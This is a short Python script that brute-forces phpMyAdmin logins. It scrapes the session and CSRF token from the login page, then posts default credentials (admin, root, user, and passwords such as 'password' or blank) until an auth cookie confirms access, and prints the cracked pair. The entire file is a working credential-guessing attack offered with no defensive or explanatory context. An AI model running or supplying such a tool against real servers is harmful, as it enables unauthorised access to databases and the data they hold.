import requests
import sys
import html
import re


pma_url = sys.argv[1]
logins = [
    'admin',
    'root',
    'user',
]
passwords = [
    'root',
    'admin',
    'user',
    'password',
    ''
]


def login(url, username, password):
    for i in range(3):
        try:
            res = requests.get(url, verify=False, timeout=5)
            cookies = dict(res.cookies)
            data = {
                'set_session': html.unescape(re.search(r"name=\"set_session\" value=\"(.+?)\"", res.text, re.I).group(1)),
                'token': html.unescape(re.search(r"name=\"token\" value=\"(.+?)\"", res.text, re.I).group(1)),
                'pma_username': username,
                'pma_password': password,
            }
            res = requests.post(url, cookies=cookies, data=data)
            cookies = dict(res.cookies)
            return 'pmaAuth-1' in cookies
        except:
            pass
    return False

for l in logins:
    for p in passwords:
        if login(pma_url, l, p):
            print('cracked', pma_url, l, p)
            exit(0)

print('failed', pma_url)
